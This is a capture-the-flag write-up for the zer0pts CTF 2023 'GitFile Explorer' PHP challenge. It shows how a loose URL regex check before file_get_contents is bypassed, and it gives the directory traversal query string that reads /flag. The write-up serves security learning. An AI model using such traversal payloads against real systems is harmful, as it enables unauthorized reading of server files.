---
title: "zer0pts CTF 2023 - GitFile Explorer"
date: "2024-11-12"
tags:
  - writeups
  - ctf
  - php
  - lfi
toc: true
math: true
bold: 
nomenu: false
---


This is a single PHP file challenge that contains a "Git File Explorer", it basically fetches a file from github/gitlab/bitbucket that you specify in the form. The challenge here is to read `/flag` at the root.

I went through the code to see how we can possibly read the flag, and the only way it seem to be out of this snippet:

```php
if ($service) {
    $url = craft_url($service, $owner, $repo, $branch, $file);
    if (preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", $url) === 1) {
        $result = file_get_contents($url);
    }
}
```

It uses `file_get_contents` via a provided URL, the URL is constructed by the function `craft_url`.

```php
function craft_url($service, $owner, $repo, $branch, $file) {
    if (strpos($service, "github") !== false) {
        /* GitHub URL */
        return $service."/".$owner."/".$repo."/".$branch."/".$file;

    } else if (strpos($service, "gitlab") !== false) {
        /* GitLab URL */
        return $service."/".$owner."/".$repo."/-/raw/".$branch."/".$file;

    } else if (strpos($service, "bitbucket") !== false) {
        /* BitBucket URL */
        return $service."/".$owner."/".$repo."/raw/".$branch."/".$file;

    }

    return null;
}
```

Now lets figure out a way to bypass the first `strpos` matching. So first of all this function does not care where it sees the string it simply return true if it sees it somewhere, so that's good to know lets go the regex that we need to bypass somehow.

So the regex seems a bit off, I spotted two things at first, the `/m` which means multiline (ends up completely random and not related to the challenge) and that it doesn't enforce a column after http, which makes it easy to request a local file. Lets try to do that.

I've put some `echo`s here and there so that I can see if it bypasses it with the following payload:

```ini
/?service=https//github
```

And it does 

```log
[Tue Nov 12 09:43:14 2024] PHP Warning:  file_get_contents(https//github/ptr-yudai/ptrlib/master/README.md): Failed to open stream: No such file or directory in /home/.<>./gitfile-explorer/index.php on line 33
```

I can see that it tries to open the folder https in the current dir and so on, the problem is that it attaches the default settings of the other attributes, so we must use them as well. After a bit trial and error I've come up with this payload:

```ini
/?service=https//github&owner=..&repo=..&branch=..&file=../../../../../flag
```

Which reads the flag:

```
zer0pts{foo/bar/../../../../../directory/traversal}
```